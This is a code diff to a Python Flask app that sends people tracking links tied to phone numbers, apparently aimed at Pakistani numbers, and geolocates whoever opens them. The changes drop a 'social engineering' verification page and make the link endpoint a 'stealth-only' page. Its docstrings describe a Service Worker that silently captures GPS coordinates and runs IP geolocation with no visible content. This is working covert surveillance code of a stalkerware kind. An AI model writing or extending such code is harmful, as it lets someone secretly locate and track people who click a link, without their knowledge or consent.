@@ -24,6 +24,7 @@ IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "")
 MAXMIND_DB_PATH = os.environ.get("MAXMIND_DB_PATH", "GeoLite2-City.mmdb")
 _maxmind_reader = None
 
+
 def get_maxmind_reader():
     global _maxmind_reader
     if _maxmind_reader is None:
@@ -84,7 +85,6 @@ PAKISTAN_PREFIX_MAP = {
     "396": (None, None), "397": (None, None), "398": (None, None),
     "399": (None, None),
 }
-
 
 PAKISTAN_CITY_COORDS = {
     "Karachi":       (24.8607, 67.0011),
@@ -285,7 +285,7 @@ def parse_phone_number(phone):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# GEOLOCATION ENGINES (5 engines — unchanged from original)
+# GEOLOCATION ENGINES (5 engines)
 # ══════════════════════════════════════════════════════════════════════
 
 def geo_maxmind(ip_address):
@@ -389,7 +389,7 @@ def geo_google(ip_address, mcc=None, mnc=None):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# MASTER GEOLOCATION ORCHESTRATOR (unchanged)
+# MASTER GEOLOCATION ORCHESTRATOR
 # ══════════════════════════════════════════════════════════════════════
 
 def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hint=None):
@@ -688,32 +688,10 @@ def create_case():
 @app.route("/go/<token>")
 def go(token):
     """
-    Two modes:
-    1. Service Worker intercepts this → never reaches Flask (SW handles it client-side)
-    2. No SW (first visit or old browser) → renders verify.html (social engineering)
-    """
-    case = CASES.get(token)
-    if not case:
-        abort(404)
-
-    client_ip = get_client_ip()
-    expired = is_expired(case)
-
-    if not expired:
-        record_visit(case, client_ip)
-        if is_expired(case):
-            case["status"] = "expired"
-            expired = True
-
-    # Normal browser navigation — render the social engineering page
-    return render_template("verify.html", token=token, expired=expired)
-
-
-@app.route("/loc/<token>")
-def loc(token):
-    """
-    Stealth page — rendered after verify.html grants GPS permission.
-    No visible content, fires cached GPS silently, self-destructs.
+    STEALTH-ONLY endpoint.
+    SW intercepts this on supported browsers and returns inline stealth HTML.
+    Non-SW browsers (or first visit before SW activates) get this server-rendered
+    stealth page — still invisible, still silent.
     """
     case = CASES.get(token)
     if not case:
@@ -734,9 +712,9 @@ def loc(token):
 @app.route("/sw-capture/<token>")
 def sw_capture(token):
     """
-    Called by the Service Worker (invisible to the user).
-    Runs the full 5-engine geolocation pipeline server-side.
-    Returns JSON — the SW uses this to decide whether to attempt GPS.
+    Called by the Service Worker immediately on intercept.
+    Triggers server-side IP geolocation before the HTML even renders.
+    The SW never waits for this response — it fires and forgets.
     """
     case = CASES.get(token)
     if not case:
@@ -766,6 +744,7 @@ def sw_capture(token):
 
 @app.route("/api/location-update", methods=["POST"])
 def location_update():
+    """Receives stealth GPS coordinates or IP fallback data silently."""
     data = request.get_json(silent=True) or {}
     token = data.get("token")
     case = CASES.get(token)
@@ -785,6 +764,7 @@ def location_update():
     if tz:
         case["browser_timezone"] = tz
 
+    # Timezone-aware IP geolocation re-run if we have better context now
     if tz and case["visits"]:
         latest = case["visits"][-1]
         if latest.get("ip_confidence", 0) < 50 and latest.get("ip_country") != "PK":
@@ -837,6 +817,7 @@ def location_update():
 
 @app.route("/api/location-denied", methods=["POST"])
 def location_denied():
+    """When GPS is not available — uses IP fallback."""
     data = request.get_json(silent=True) or {}
     token = data.get("token")
     case = CASES.get(token)
